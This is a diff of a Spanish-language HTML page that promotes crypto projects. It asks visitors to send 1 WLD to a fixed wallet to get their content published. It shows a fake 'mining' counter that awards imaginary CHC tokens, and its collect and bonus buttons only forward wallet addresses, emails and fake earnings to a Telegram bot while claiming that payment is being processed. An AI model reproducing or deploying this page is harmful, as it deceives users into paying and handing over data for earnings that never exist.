@@ -1,9 +1,62 @@
-<!-- ... Sección head y estilos se mantiene igual ... -->
-
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Promociona tu Proyecto</title>
+  <style>
+    body {
+      text-align: center;
+      padding: 20px;
+      font-family: Arial, sans-serif;
+    }
+    #iframeContainer {
+      width: 100%;
+      height: 500px;
+      border: 2px solid #ccc;
+      margin-top: 20px;
+      overflow: hidden;
+      border-radius: 10px;
+    }
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+    #resultado {
+      margin-top: 20px;
+    }
+    input, button {
+      margin: 10px;
+      padding: 10px;
+      width: 80%;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #4CAF50;
+      color: white;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+    .nota {
+      color: red;
+      font-weight: bold;
+    }
+    .bono-text {
+      font-size: 0.9em;
+      color: gray;
+    }
+  </style>
+</head>
 <body>
 
 <h2>Promociona tu Blog, Video o Proyecto relacionado con WLD o Tokens</h2>
-<p style="color: red; font-weight: bold;">Para publicar tu contenido, envía 1 WLD (o 135371.31 CHUN) a la billetera destino:<br>
+<p class="nota">Para publicar tu contenido, envía 1 WLD (o 135371.31 CHUN) a la billetera destino:<br>
 <span style="font-size: 1.2em;">0xdc178d65c502f9589bb1a35af08b5723f85ec168</span></p>
 <p><a href="#" onclick="abrirGuia(); return false;">Guía para enviar WLD</a></p>
 
@@ -21,20 +74,20 @@
 
 <hr>
 
-<button onclick="pararMineria()">Parar Mineria</button>
-<input type="text" id="walletParar" placeholder="Tu billetera para detener minería" />
-<button onclick="continuarMineria()">Continuar Mineria</button>
+<input type="text" id="walletCobro" placeholder="Tu billetera WorldChain para cobrar" />
+<button onclick="cobrar()">Cobrar CHC y CHUN</button>
 
 <hr>
 
-<h3>Cobrar CHC y CHUN</h3>
-<input type="text" id="walletCobro" placeholder="Tu billetera WorldChain" />
-<button onclick="cobrar()">Cobrar</button>
-
-<h3>Bono único por Humano Verificado</h3>
 <input type="text" id="walletBono" placeholder="Tu billetera WorldChain para bono" />
-<p style="color: orange;">Este bono solo se puede cobrar una vez. Verifica tu ID y espera más bonos.</p>
-<button onclick="cobrarBono()">Cobrar Bono Único</button>
+<button onclick="cobrarBono()">Cobrar tu CHC y CHUN bono único por Humano Verificado</button>
+<p class="bono-text">Este bono solo puede cobrarse una vez. Verifica tu ID y espera más bonos.</p>
+
+<hr>
+
+<button onclick="pararMineria()">Parar Mineria</button>
+<input type="text" id="walletMineria" placeholder="Tu billetera para recibir CHC ganados" />
+<button onclick="continuarMineria()">Continuar Mineria</button>
 
 <script>
   let tiempoTotal = 0;
@@ -58,43 +111,13 @@
     "https://gmcas77.blogspot.com"
   ];
 
-  document.addEventListener("visibilitychange", () => {
-    ventanaActiva = !document.hidden;
-  });
-
   function redireccionAleatoria() {
     const indiceAleatorio = Math.floor(Math.random() * urls.length);
-    document.getElementById('iframeRedireccion').src = urls[indiceAleatorio];
+    const urlRedireccion = urls[indiceAleatorio];
+    document.getElementById('iframeRedireccion').src = urlRedireccion;
     setTimeout(redireccionAleatoria, 10000);
   }
   redireccionAleatoria();
-
-  function contarTiempo() {
-    if (minando && ventanaActiva) {
-      tiempoTotal++;
-      if (tiempoTotal % 100 === 0) {
-        alert(`¡Has ganado 100 CHC!`);
-        enviarMensajeTelegram(`¡Usuario ha ganado 100 CHC!`);
-      }
-    }
-  }
-  interval = setInterval(contarTiempo, 1000);
-
-  function pararMineria() {
-    clearInterval(interval);
-    minando = false;
-    const wallet = document.getElementById('walletParar').value;
-    alert(`Ganaste ${tiempoTotal} CHC! Gracias por usar la página.`);
-    enviarMensajeTelegram(`Minería detenida.\nGanancia: ${tiempoTotal} CHC\nWallet: ${wallet}`);
-  }
-
-  function continuarMineria() {
-    if (!minando) {
-      interval = setInterval(contarTiempo, 1000);
-      minando = true;
-      alert('Minería reanudada.');
-    }
-  }
 
   function guardarDatos() {
     const walletUsuario = document.getElementById('walletUsuario').value;
@@ -106,47 +129,81 @@
       return;
     }
 
-    const mensaje = `Publicidad Solicitada:\nWallet: ${walletUsuario}\nCorreo: ${correo}\nURL: ${urlPromocion}`;
+    const mensaje = `Publicidad Solicitada:\nWallet Usuario: ${walletUsuario}\nCorreo: ${correo}\nURL Promocion: ${urlPromocion}`;
     enviarMensajeTelegram(mensaje);
-    alert('Tu solicitud ha sido enviada. Recibirás confirmación en breve.');
+    alert('Tu solicitud ha sido enviada por Telegram. Recibirás confirmación en breve.');
   }
+
+  function pararMineria() {
+    clearInterval(interval);
+    minando = false;
+    const wallet = document.getElementById('walletMineria').value;
+    const mensaje = `Minería detenida. Ganancia: ${tiempoTotal} CHC\nWallet: ${wallet}`;
+    alert(`Ganaste ${tiempoTotal} CHC! Gracias por usar la página.`);
+    enviarMensajeTelegram(mensaje);
+  }
+
+  function continuarMineria() {
+    if (!minando) {
+      minando = true;
+      interval = setInterval(contarTiempo, 1000);
+      alert("Minería reanudada.");
+    }
+  }
+
+  function contarTiempo() {
+    if (minando && ventanaActiva) {
+      tiempoTotal++;
+      if (tiempoTotal % 100 === 0) {
+        alert(`¡Has ganado 100 CHC!`);
+        enviarMensajeTelegram(`¡Usuario ha ganado 100 CHC!`);
+      }
+    }
+  }
+
+  interval = setInterval(contarTiempo, 1000);
 
   function cobrar() {
     const wallet = document.getElementById('walletCobro').value;
-    if (!wallet) {
-      alert('Por favor ingresa tu billetera WLD.');
-      return;
-    }
-    enviarMensajeTelegram(`Solicitud de COBRO CHC/CHUN\nWallet: ${wallet}\nGanancia: ${tiempoTotal} CHC`);
-    alert('Tu pago se está procesando...');
-    clearInterval(interval);
-    minando = false;
+    if (!wallet) return alert("Ingresa tu billetera para cobrar.");
+    enviarMensajeTelegram(`Solicitud de cobro CHC/CHUN para la billetera: ${wallet}`);
+    alert("Tu pago se está procesando.");
   }
 
   function cobrarBono() {
     const wallet = document.getElementById('walletBono').value;
-    if (!wallet) {
-      alert('Por favor ingresa tu billetera para el bono.');
-      return;
-    }
-    enviarMensajeTelegram(`Solicitud de BONO ÚNICO CHC/CHUN\nWallet: ${wallet}`);
-    alert('Tu bono único está siendo procesado. Solo puede cobrarse una vez.');
+    if (!wallet) return alert("Ingresa tu billetera para el bono.");
+    enviarMensajeTelegram(`Bono único solicitado para la billetera: ${wallet}`);
+    alert("Tu pago se está procesando.");
   }
 
   function enviarMensajeTelegram(mensaje) {
     const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
     fetch(url, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({ chat_id: chatId, text: mensaje })
-    }).then(response => response.json())
-      .then(data => { if (!data.ok) console.error('Telegram error:', data); })
-      .catch(error => console.error('Telegram fetch error:', error));
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (!data.ok) console.error('Error al enviar mensaje:', data);
+    })
+    .catch(err => console.error('Error en Telegram:', err));
   }
 
   function abrirGuia() {
-    document.getElementById("iframeRedireccion").src = "./enviarwld.html";
+    const iframe = document.getElementById("iframeRedireccion");
+    iframe.src = "./enviarwld.html";
   }
+
+  document.addEventListener("visibilitychange", () => {
+    ventanaActiva = !document.hidden;
+    if (!ventanaActiva) {
+      console.log("Usuario ha salido de la pestaña. Pausando minería.");
+    } else {
+      console.log("Usuario ha regresado a la pestaña.");
+    }
+  });
 </script>
 
 </body>
